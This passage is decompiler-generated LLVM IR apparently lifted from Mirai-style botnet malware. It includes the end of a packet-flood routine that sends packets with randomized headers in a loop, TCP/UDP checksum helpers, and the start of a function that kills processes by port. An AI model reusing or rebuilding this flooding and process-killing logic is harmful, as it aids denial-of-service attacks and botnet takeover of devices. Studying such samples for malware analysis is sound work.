  %v0_c734 = load i32, i32* @r6, align 4
  %v1_c734 = add i32 %v0_c734, 2
  %v2_c734 = inttoptr i32 %v1_c734 to i16*
  %v3_c734 = load i16, i16* %v2_c734, align 2
  %v4_c734 = zext i16 %v3_c734 to i32
  store i32 %v4_c734, i32* @r6, align 4
  %v1_c738 = load i32, i32* @r8, align 4
  %v2_c738 = add i32 %v1_c738, %v5_c730
  store i32 %v2_c738, i32* @lr, align 4
  %v3_c73c = add i32 %v2_c738, 2
  %v4_c73c = inttoptr i32 %v3_c73c to i16*
  store i16 %v3_c734, i16* %v4_c73c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c748 = load i32, i32* @r5, align 4
  store i32 %v0_c748, i32* %r1.global-to-local, align 4
  %v0_c74c = load i32, i32* @sl, align 4
  store i32 %v0_c74c, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_c754 = load i32, i32* @lr, align 4
  %v6_c75c = call i32 @__libc_sendto(i32 %v0_c74c, i32 %v0_c748, i32 60, i32 16384, i32 %v0_c754, i32 16)
  %v3_c760 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c760, i32* %r3.global-to-local, align 4
  %v1_c764 = add i32 %v3_c760, 1
  store i32 %v1_c764, i32* %r0.global-to-local, align 4
  %v1_c768 = load i32, i32* @r7, align 4
  %v9_c768 = icmp eq i32 %v1_c764, %v1_c768
  store i1 %v9_c768, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c764, i32* %stack_var_-44, align 4
  %v5_c770 = icmp slt i32 %v1_c764, %v1_c768
  br i1 %v5_c770, label %dec_label_pc_c678, label %dec_label_pc_c774

dec_label_pc_c774:                                ; preds = %dec_label_pc_c6f0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c778 = icmp eq i32 %v1_c768, 0
  store i1 %v2_c778, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c778, label %dec_label_pc_c664, label %dec_label_pc_c674

dec_label_pc_c788:                                ; preds = %dec_label_pc_c678
  %v1_c788 = add i32 %v2_c680, 16
  %v2_c788 = inttoptr i32 %v1_c788 to i32*
  %v3_c788 = load i32, i32* %v2_c788, align 4
  store i32 %v3_c788, i32* %r4.global-to-local, align 4
  %v0_c78c = call i32 @rand_next()
  store i32 %v0_c78c, i32* %r0.global-to-local, align 4
  %v3_c790 = load i32, i32* %stack_var_-44, align 4
  %v5_c798 = mul i32 %v3_c790, 24
  %v0_c79c = load i32, i32* %r4.global-to-local, align 4
  %v1_c79c = and i32 %v0_c79c, 16711680
  %v3_c7a0 = udiv i32 %v0_c79c, 16777216
  %v4_c7a4 = udiv i32 %v1_c79c, 256
  %v5_c7a4 = or i32 %v4_c7a4, %v3_c7a0
  store i32 %v5_c7a4, i32* %r2.global-to-local, align 4
  %v1_c7a8 = load i32, i32* @r8, align 4
  %v2_c7a8 = add i32 %v1_c7a8, %v5_c798
  store i32 %v2_c7a8, i32* %r1.global-to-local, align 4
  %v1_c7ac = and i32 %v0_c79c, 65280
  store i32 %v1_c7ac, i32* %r3.global-to-local, align 4
  %v1_c7b0 = add i32 %v2_c7a8, 20
  %v2_c7b0 = inttoptr i32 %v1_c7b0 to i8*
  %v3_c7b0 = load i8, i8* %v2_c7b0, align 1
  %v4_c7b0 = zext i8 %v3_c7b0 to i32
  %v5_c7b8 = call i32 @llvm.bswap.i32(i32 %v0_c79c)
  %v7_c7bc = lshr i32 %v0_c78c, %v4_c7b0
  %v8_c7bc = add i32 %v7_c7bc, %v5_c7b8
  store i32 %v8_c7bc, i32* %r2.global-to-local, align 4
  %v1_c7c0 = and i32 %v8_c7bc, 16711680
  store i32 %v1_c7c0, i32* %r0.global-to-local, align 4
  %v1_c7cc = and i32 %v8_c7bc, 65280
  store i32 %v1_c7cc, i32* %r1.global-to-local, align 4
  %v5_c7d4 = call i32 @llvm.bswap.i32(i32 %v8_c7bc)
  %v1_c7d8 = load i32, i32* @r5, align 4
  %v2_c7d8 = add i32 %v1_c7d8, 16
  %v3_c7d8 = inttoptr i32 %v2_c7d8 to i32*
  store i32 %v5_c7d4, i32* %v3_c7d8, align 4
  store i32 %v6_c38c, i32* %r3.global-to-local, align 4
  store i1 %v8_c7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c7e0, label %dec_label_pc_c7e8, label %dec_label_pc_c6a4

dec_label_pc_c7e8:                                ; preds = %dec_label_pc_c788, %dec_label_pc_c698
  %v0_c7e8 = call i32 @rand_next()
  store i32 65536, i32* %r4.global-to-local, align 4
  %v1_c7f0 = load i32, i32* @r5, align 4
  %v2_c7f0 = add i32 %v1_c7f0, 12
  %v3_c7f0 = inttoptr i32 %v2_c7f0 to i32*
  store i32 %v0_c7e8, i32* %v3_c7f0, align 4
  store i32 %v3_c3f4, i32* %r0.global-to-local, align 4
  %v0_c7f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c7f8 = add i32 %v0_c7f8, -1
  store i32 %v1_c7f8, i32* @r4, align 4
  %v9_c7fc = icmp eq i32 %v3_c3f4, %v1_c7f8
  store i1 %v9_c7fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7fc, label %dec_label_pc_c804, label %dec_label_pc_c6b8

dec_label_pc_c804:                                ; preds = %dec_label_pc_c7e8, %dec_label_pc_c6a4
  %v0_c804 = call i32 @rand_next()
  %v1_c804 = trunc i32 %v0_c804 to i16
  store i32 %v0_c804, i32* %r0.global-to-local, align 4
  store i32 %v3_c3f8, i32* %r1.global-to-local, align 4
  %v1_c80c = load i32, i32* @r4, align 4
  %v9_c80c = icmp eq i32 %v3_c3f8, %v1_c80c
  store i1 %v9_c80c, i1* %cpsr_z.global-to-local, align 1
  %v3_c810 = load i32, i32* @r5, align 4
  %v4_c810 = add i32 %v3_c810, 4
  %v5_c810 = inttoptr i32 %v4_c810 to i16*
  store i16 %v1_c804, i16* %v5_c810, align 2
  br i1 %v9_c80c, label %dec_label_pc_c818, label %dec_label_pc_c804.dec_label_pc_c6c4_crit_edge

dec_label_pc_c804.dec_label_pc_c6c4_crit_edge:    ; preds = %dec_label_pc_c804
  %v1_c6c8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c6c4

dec_label_pc_c818:                                ; preds = %dec_label_pc_c804, %dec_label_pc_c6b8
  %v0_c818 = call i32 @rand_next()
  %v1_c818 = trunc i32 %v0_c818 to i16
  store i32 %v0_c818, i32* %r0.global-to-local, align 4
  store i32 %v3_c3fc, i32* %r2.global-to-local, align 4
  %v1_c820 = load i32, i32* @r4, align 4
  %v9_c820 = icmp eq i32 %v3_c3fc, %v1_c820
  store i1 %v9_c820, i1* %cpsr_z.global-to-local, align 1
  %v3_c824 = load i32, i32* @r5, align 4
  %v4_c824 = add i32 %v3_c824, 20
  %v5_c824 = inttoptr i32 %v4_c824 to i16*
  store i16 %v1_c818, i16* %v5_c824, align 2
  br i1 %v9_c820, label %dec_label_pc_c82c, label %dec_label_pc_c818.dec_label_pc_c6d0_crit_edge

dec_label_pc_c818.dec_label_pc_c6d0_crit_edge:    ; preds = %dec_label_pc_c818
  %v1_c6d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c6d0

dec_label_pc_c82c:                                ; preds = %dec_label_pc_c818, %dec_label_pc_c6c4
  %v0_c82c = call i32 @rand_next()
  %v1_c82c = trunc i32 %v0_c82c to i16
  store i32 %v0_c82c, i32* %r0.global-to-local, align 4
  store i32 %v5_c2c8, i32* %r3.global-to-local, align 4
  %v1_c834 = load i32, i32* @r4, align 4
  %v9_c834 = icmp eq i32 %v5_c2c8, %v1_c834
  store i1 %v9_c834, i1* %cpsr_z.global-to-local, align 1
  %v3_c838 = load i32, i32* @r6, align 4
  %v4_c838 = add i32 %v3_c838, 2
  %v5_c838 = inttoptr i32 %v4_c838 to i16*
  store i16 %v1_c82c, i16* %v5_c838, align 2
  br i1 %v9_c834, label %dec_label_pc_c840, label %dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge

dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge:    ; preds = %dec_label_pc_c82c
  %v1_c6e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c6dc

dec_label_pc_c840:                                ; preds = %dec_label_pc_c82c, %dec_label_pc_c6d0
  %v0_c840 = call i32 @rand_next()
  %v1_c844 = load i32, i32* @r6, align 4
  %v2_c844 = add i32 %v1_c844, 4
  %v3_c844 = inttoptr i32 %v2_c844 to i32*
  store i32 %v0_c840, i32* %v3_c844, align 4
  store i32 %v6_c2e0, i32* %r0.global-to-local, align 4
  %v1_c84c = load i32, i32* @r4, align 4
  %v9_c84c = icmp eq i32 %v6_c2e0, %v1_c84c
  store i1 %v9_c84c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c84c, label %dec_label_pc_c854, label %dec_label_pc_c6e8

dec_label_pc_c854:                                ; preds = %dec_label_pc_c840, %dec_label_pc_c6dc
  %v0_c854 = call i32 @rand_next()
  store i32 %v0_c854, i32* %r0.global-to-local, align 4
  %v0_c858 = load i32, i32* @fp, align 4
  %v2_c858 = icmp eq i32 %v0_c858, 0
  store i1 %v2_c858, i1* %cpsr_z.global-to-local, align 1
  %v1_c85c = load i32, i32* @r6, align 4
  %v2_c85c = add i32 %v1_c85c, 8
  %v3_c85c = inttoptr i32 %v2_c85c to i32*
  store i32 %v0_c854, i32* %v3_c85c, align 4
  br i1 %v2_c858, label %dec_label_pc_c6f0, label %dec_label_pc_c864

dec_label_pc_c864:                                ; preds = %dec_label_pc_c6e8, %dec_label_pc_c854
  %v0_c864 = call i32 @rand_next()
  %v1_c864 = trunc i32 %v0_c864 to i16
  store i32 %v0_c864, i32* %r0.global-to-local, align 4
  %v3_c868 = load i32, i32* @r6, align 4
  %v4_c868 = add i32 %v3_c868, 18
  %v5_c868 = inttoptr i32 %v4_c868 to i16*
  store i16 %v1_c864, i16* %v5_c868, align 2
  br label %dec_label_pc_c6f0

dec_label_pc_c870:                                ; preds = %dec_label_pc_c3b0
  %v0_c870 = load i32, i32* @sl, align 4
  store i32 %v0_c870, i32* %r0.global-to-local, align 4
  %v1_c874 = call i32 @__GI___libc_close(i32 %v0_c870)
  store i32 %v1_c874, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c878

dec_label_pc_c878:                                ; preds = %entry, %dec_label_pc_c870
  %v1_c880 = phi i32 [ %v3_c3a0, %entry ], [ %v1_c874, %dec_label_pc_c870 ]
  store i32 %v3_c1dc, i32* %r4.global-to-local, align 4
  store i32 %v24_c1dc, i32* %fp.global-to-local, align 4
  store i32 %v27_c1dc, i32* %lr.global-to-local, align 4
  ret i32 %v1_c880

; uselistorder directives
  uselistorder i32 %v0_c864, { 1, 0 }
  uselistorder i32 %v0_c82c, { 1, 0 }
  uselistorder i32 %v0_c818, { 1, 0 }
  uselistorder i32 %v0_c804, { 1, 0 }
  uselistorder i32 %v1_c7f8, { 1, 2, 0 }
  uselistorder i32 %v0_c79c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_c764, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c730, { 1, 0 }
  uselistorder i32 %v4_c720, { 1, 0 }
  uselistorder i1 %v3_c6b0, { 1, 0 }
  uselistorder i32 %v2_c654, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c4bc, { 1, 2, 0 }
  uselistorder i32 %v1_c488, { 2, 1, 0 }
  uselistorder i32 %v1_c484, { 2, 0, 1 }
  uselistorder i32 %v1_c480, { 2, 0, 1 }
  uselistorder i32 %v1_c47c, { 2, 0, 1 }
  uselistorder i32 %v1_c458, { 1, 0 }
  uselistorder i32 %v3_c3f4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_c3e8, { 1, 0, 2 }
  uselistorder i32 %v0_c3e4, { 1, 0, 3, 2 }
  uselistorder i1 %v7_c3d0, { 1, 0 }
  uselistorder i1 %v7_c3a4, { 1, 0 }
  uselistorder i32 %v3_c3a0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_c38c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v6_c2e0, { 3, 2, 1, 0 }
  uselistorder i32 %v5_c2c8, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_c24c, { 1, 0 }
  uselistorder i32 %v7_c234, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 39, 38, 41, 40, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 5, 4, 6, 8, 9, 7, 10, 12, 11, 13, 15, 14, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 27, 28, 32, 29, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 41, { 2, 0, 1, 3, 4 }
  uselistorder i32 (i32, i32*, i32, i32)* @attack_get_opt_int, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 106, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c878, { 1, 0 }
  uselistorder label %dec_label_pc_c864, { 1, 0 }
  uselistorder label %dec_label_pc_c6f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c674, { 1, 0 }
  uselistorder label %dec_label_pc_c664, { 1, 0, 2 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
}

define i32 @checksum_generic(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_c8ac, label %dec_label_pc_c894

dec_label_pc_c894:                                ; preds = %entry
  %v0_c89c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c898

dec_label_pc_c898:                                ; preds = %dec_label_pc_c898, %dec_label_pc_c894
  %v0_c8a4 = phi i32 [ %v2_c8a4, %dec_label_pc_c898 ], [ 0, %dec_label_pc_c894 ]
  %v0_c89c = phi i32 [ %v5_c89c, %dec_label_pc_c898 ], [ %v0_c89c.pre, %dec_label_pc_c894 ]
  %v0_c898 = phi i32 [ %v1_c898, %dec_label_pc_c898 ], [ %arg1, %dec_label_pc_c894 ]
  %v1_c898 = add i32 %v0_c898, -2
  %v1_c89c = inttoptr i32 %v0_c89c to i16*
  %v2_c89c = load i16, i16* %v1_c89c, align 2
  %v3_c89c = zext i16 %v2_c89c to i32
  %v5_c89c = add i32 %v0_c89c, -2
  store i32 %v5_c89c, i32* @r0, align 4
  %v2_c8a4 = add i32 %v3_c89c, %v0_c8a4
  %v1_c898.cmp = icmp ugt i32 %v1_c898, 1
  br i1 %v1_c898.cmp, label %dec_label_pc_c898, label %dec_label_pc_c8ac.loopexit

dec_label_pc_c8ac.loopexit:                       ; preds = %dec_label_pc_c898
  br label %dec_label_pc_c8ac

dec_label_pc_c8ac:                                ; preds = %entry, %dec_label_pc_c8ac.loopexit
  %v1_c8b4 = phi i32 [ %v2_c8a4, %dec_label_pc_c8ac.loopexit ], [ 0, %entry ]
  %v0_c8ac = phi i32 [ %v1_c898, %dec_label_pc_c8ac.loopexit ], [ %arg1, %entry ]
  %v7_c8ac = icmp eq i32 %v0_c8ac, 1
  br i1 %v7_c8ac, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c8ac
  %v1_c8b0 = load i32, i32* @r0, align 4
  %v2_c8b0 = inttoptr i32 %v1_c8b0 to i8*
  %v3_c8b0 = load i8, i8* %v2_c8b0, align 1
  %v4_c8b0 = zext i8 %v3_c8b0 to i32
  %v3_c8b4 = add i32 %v1_c8b4, %v4_c8b0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c8ac, %bb
  %v0_c8b8 = phi i32 [ %v1_c8b4, %dec_label_pc_c8ac ], [ %v3_c8b4, %bb ]
  %v3_c8bc = urem i32 %v0_c8b8, 65536
  %v4_c8c0 = udiv i32 %v0_c8b8, 65536
  %v5_c8c0 = add nuw nsw i32 %v4_c8c0, %v3_c8bc
  %v4_c8c4 = udiv i32 %v5_c8c0, 65536
  %v5_c8c4 = add nuw nsw i32 %v4_c8c4, %v5_c8c0
  %v1_c8c8 = urem i32 %v5_c8c4, 65536
  %v3_c8d0 = xor i32 %v1_c8c8, 65535
  ret i32 %v3_c8d0

; uselistorder directives
  uselistorder i32 %v5_c8c0, { 1, 0 }
  uselistorder i32 %v5_c89c, { 1, 0 }
  uselistorder i32 %v1_c898, { 1, 0, 2 }
  uselistorder i32 %v0_c89c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_c8ac, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_c8e8 = add i32 %arg1, 12
  %v2_c8e8 = inttoptr i32 %v1_c8e8 to i32*
  %v3_c8e8 = load i32, i32* %v2_c8e8, align 4
  %v1_c8ec = add i32 %arg1, 16
  %v2_c8ec = inttoptr i32 %v1_c8ec to i32*
  %v3_c8ec = load i32, i32* %v2_c8ec, align 4
  %v7_c8f0 = icmp sgt i32 %arg3, 1
  br i1 %v7_c8f0, label %dec_label_pc_c8fc.preheader, label %dec_label_pc_c910

dec_label_pc_c8fc.preheader:                      ; preds = %entry
  %v0_c900.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c8fc

dec_label_pc_c8fc:                                ; preds = %dec_label_pc_c8fc.preheader, %dec_label_pc_c8fc
  %v0_c908 = phi i32 [ 0, %dec_label_pc_c8fc.preheader ], [ %v2_c908, %dec_label_pc_c8fc ]
  %v0_c900 = phi i32 [ %v0_c900.pre, %dec_label_pc_c8fc.preheader ], [ %v5_c900, %dec_label_pc_c8fc ]
  %v0_c8fc = phi i32 [ %arg3, %dec_label_pc_c8fc.preheader ], [ %v1_c8fc, %dec_label_pc_c8fc ]
  %v1_c8fc = add nsw i32 %v0_c8fc, -2
  %v1_c900 = inttoptr i32 %v0_c900 to i16*
  %v2_c900 = load i16, i16* %v1_c900, align 2
  %v3_c900 = zext i16 %v2_c900 to i32
  %v5_c900 = add i32 %v0_c900, -2
  store i32 %v5_c900, i32* @r1, align 4
  %v2_c908 = add i32 %v3_c900, %v0_c908
  %v8_c90c = icmp sgt i32 %v1_c8fc, 1
  br i1 %v8_c90c, label %dec_label_pc_c8fc, label %dec_label_pc_c910.loopexit

dec_label_pc_c910.loopexit:                       ; preds = %dec_label_pc_c8fc
  br label %dec_label_pc_c910

dec_label_pc_c910:                                ; preds = %dec_label_pc_c910.loopexit, %entry
  %v1_c91c = phi i32 [ %v2_c908, %dec_label_pc_c910.loopexit ], [ 0, %entry ]
  %v0_c910 = phi i32 [ %v1_c8fc, %dec_label_pc_c910.loopexit ], [ %arg3, %entry ]
  %v7_c910 = icmp eq i32 %v0_c910, 1
  br i1 %v7_c910, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_c910
  br label %bb19

bb:                                               ; preds = %dec_label_pc_c910
  %v1_c914 = load i32, i32* @r1, align 4
  %v2_c914 = inttoptr i32 %v1_c914 to i8*
  %v3_c914 = load i8, i8* %v2_c914, align 1
  %v4_c914 = zext i8 %v3_c914 to i32
  %v3_c91c = add i32 %v4_c914, %v1_c91c
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_c944 = phi i32 [ %v1_c91c, %.thread ], [ %v3_c91c, %bb ]
  %v0_c924 = mul i32 %v3_c8e8, 65536
  %v3_c924 = udiv i32 %v0_c924, 65536
  %v3_c928 = urem i32 %v3_c8ec, 65536
  %v4_c930 = udiv i32 %v3_c8e8, 65536
  %v2_c92c = add nuw nsw i32 %v3_c928, %v4_c930
  %v5_c930 = add nuw nsw i32 %v2_c92c, %v3_c924
  %v1_c934 = add i32 %arg1, 9
  %v2_c934 = inttoptr i32 %v1_c934 to i8*
  %v3_c934 = load i8, i8* %v2_c934, align 1
  %v4_c934 = zext i8 %v3_c934 to i32
  %v4_c938 = udiv i32 %v3_c8ec, 65536
  %v3_c940 = mul nuw nsw i32 %v4_c934, 256
  %v5_c938 = add i32 %v4_c938, %arg2
  %v2_c93c = add i32 %v5_c938, %v1_c944
  %v2_c944 = add i32 %v2_c93c, %v5_c930
  %v2_c948 = add i32 %v2_c944, %v3_c940
  %tmp = icmp ult i32 %v2_c948, 65536
  br i1 %tmp, label %dec_label_pc_c968, label %dec_label_pc_c954

dec_label_pc_c954:                                ; preds = %bb19, %dec_label_pc_c954
  %v2_c95c5 = phi i32 [ %v2_c95c, %dec_label_pc_c954 ], [ %v2_c948, %bb19 ]
  %v3_c9606.in = phi i32 [ %v2_c95c, %dec_label_pc_c954 ], [ %v2_c948, %bb19 ]
  %v3_c9606 = udiv i32 %v3_c9606.in, 65536
  %v3_c958 = urem i32 %v2_c95c5, 65536
  %v2_c95c = add nuw nsw i32 %v3_c958, %v3_c9606
  %tmp20 = icmp ult i32 %v2_c95c, 65536
  br i1 %tmp20, label %dec_label_pc_c968.loopexit, label %dec_label_pc_c954

dec_label_pc_c968.loopexit:                       ; preds = %dec_label_pc_c954
  br label %dec_label_pc_c968

dec_label_pc_c968:                                ; preds = %dec_label_pc_c968.loopexit, %bb19
  %v0_c968 = phi i32 [ %v2_c95c, %dec_label_pc_c968.loopexit ], [ %v2_c948, %bb19 ]
  %v1_c968 = urem i32 %v0_c968, 65536
  %v3_c970 = xor i32 %v1_c968, 65535
  ret i32 %v3_c970

; uselistorder directives
  uselistorder i32 %v2_c95c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_c948, { 3, 0, 2, 1 }
  uselistorder i32 %v1_c91c, { 1, 0 }
  uselistorder i32 %v5_c900, { 1, 0 }
  uselistorder i32 %v0_c900, { 1, 0 }
  uselistorder i32 %v3_c8e8, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c954, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_c8fc, { 1, 0 }
}

define i32 @killer_kill_by_port(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_c97c = load i32, i32* @r4, align 4
  %v6_c97c = load i32, i32* @r5, align 4
  %v9_c97c = load i32, i32* @r6, align 4
  %v12_c97c = load i32, i32* @r7, align 4
  %v15_c97c = load i32, i32* @r8, align 4
  %v18_c97c = load i32, i32* @sb, align 4
  %v21_c97c = load i32, i32* @sl, align 4
  %v24_c97c = load i32, i32* @fp, align 4
  %v27_c97c = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_c998 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_c998, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_c9c4 = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_c9c4, i32* @fp, align 4
  %v4_c9d0 = call i32 @__GI_memset(i8* nonnull %stack_var_-585, i32 0, i32 513)
  %v2_c9d4 = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_c9d4, i32* @sl, align 4
  %v0_c9d8 = load i32, i32* @r5, align 4
  %v3_c9e4 = bitcast i32* %stack_var_-8777 to i8*
  %v4_c9e4 = call i32 @__GI_memset(i8* %v3_c9e4, i32 %v0_c9d8, i32 4096)
  %v0_c9ec = load i32, i32* @r5, align 4
  %v3_c9f8 = bitcast i32* %stack_var_-4681 to i8*
  %v4_c9f8 = call i32 @__GI_memset(i8* %v3_c9f8, i32 %v0_c9ec, i32 4096)
  %v2_c9fc = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_c9fc, i32* @sb, align 4
  %v0_ca00 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca00 = udiv i32 %v0_ca00, 256
  %v1_ca04 = urem i32 %v0_ca00, 256
  store i32 %v1_ca04, i32* @r4, align 4
  %v3_ca14 = trunc i32 %v3_ca00 to i8
  %v4_ca14 = call i32 @util_itoa(i8 %v3_ca14, i32 16, i32 %v2_c9fc)
  %v2_ca1c = call i32 @util_strlen(i8* nonnull %stack_var_-72)
  %v7_ca20 = icmp eq i32 %v2_ca1c, 2
  br i1 %v7_ca20, label %dec_label_pc_cee4, label %dec_label_pc_ca28

dec_label_pc_ca28:                                ; preds = %entry, %dec_label_pc_cee4
  %v1_ca2c = call i32 @table_unlock_val(i32 13)
  %v1_ca34 = call i32 @table_unlock_val(i32 14)
  %v1_ca3c = call i32 @table_unlock_val(i32 15)
  %v1_ca44 = call i32 @table_unlock_val(i32 17)
  %v0_ca48 = load i32, i32* @r5, align 4
  %v2_ca50 = inttoptr i32 %v0_ca48 to i32*
  %v3_ca50 = call i32 @table_retrieve_val(i32 17, i32* %v2_ca50)
  %v0_ca54 = load i32, i32* @r5, align 4
  %v2_ca58 = inttoptr i32 %v0_ca54 to i32*
  %v3_ca58 = call i32 @__libc_open(i32 %v3_ca50, i32* %v2_ca58)
  %v7_ca5c = icmp eq i32 %v3_ca58, -1
  store i32 %v3_ca58, i32* @r8, align 4
  br i1 %v7_ca5c, label %bb, label %dec_label_pc_ca6c.preheader

bb:                                               ; preds = %dec_label_pc_ca28
  %v1_ca64 = load i32, i32* @r5, align 4
  store i32 %v1_ca64, i32* @r4, align 4
  br label %dec_label_pc_ce80

dec_label_pc_ca6c.preheader:                      ; preds = %dec_label_pc_ca28
  %v4_ca7856 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v3_ca58)
  %v2_ca7c58 = icmp eq i32 %v4_ca7856, 0
  br i1 %v2_ca7c58, label %dec_label_pc_cc04.loopexit, label %dec_label_pc_ca84.lr.ph

dec_label_pc_ca84.lr.ph:                          ; preds = %dec_label_pc_ca6c.preheader
  %v2_cacc = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_ca84

dec_label_pc_ca84:                                ; preds = %dec_label_pc_ca84.lr.ph, %dec_label_pc_ca6c.backedge
  %v3_ca88 = load i8, i8* %stack_var_-585, align 1
  %v4_ca88 = sext i8 %v3_ca88 to i32
  store i32 %v4_ca88, i32* @r3, align 4
  %v2_ca8c = icmp eq i8 %v3_ca88, 0
  br i1 %v2_ca8c, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_ca84
  %v8_ca90 = icmp eq i8 %v3_ca88, 58
  br i1 %v8_ca90, label %.thread8, label %dec_label_pc_caa4

.thread8:                                         ; preds = %bb125
  br label %dec_label_pc_cabc

bb126:                                            ; preds = %dec_label_pc_ca84
  br label %dec_label_pc_cabc

dec_label_pc_caa4:                                ; preds = %bb125
  %v1_caac.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_caa8

dec_label_pc_caa8:                                ; preds = %bb127, %dec_label_pc_caa4
  %v0_caa8 = phi i32 [ %v1_caa8, %bb127 ], [ 0, %dec_label_pc_caa4 ]
  %v1_caa8 = add i32 %v0_caa8, 1
  %v2_caac = add i32 %v1_caa8, %v1_caac.pre
  %v3_caac = inttoptr i32 %v2_caac to i8*
  %v4_caac = load i8, i8* %v3_caac, align 1
  %v6_caac = zext i8 %v4_caac to i32
  store i32 %v6_caac, i32* @r3, align 4
  %v2_cab0 = icmp eq i8 %v4_caac, 0
  br i1 %v2_cab0, label %dec_label_pc_cabc, label %bb127

bb127:                                            ; preds = %dec_label_pc_caa8
  %v8_cab4 = icmp eq i8 %v4_caac, 58
  br i1 %v8_cab4, label %dec_label_pc_cabc, label %dec_label_pc_caa8

dec_label_pc_cabc:                                ; preds = %dec_label_pc_caa8, %bb127, %bb126, %.thread8
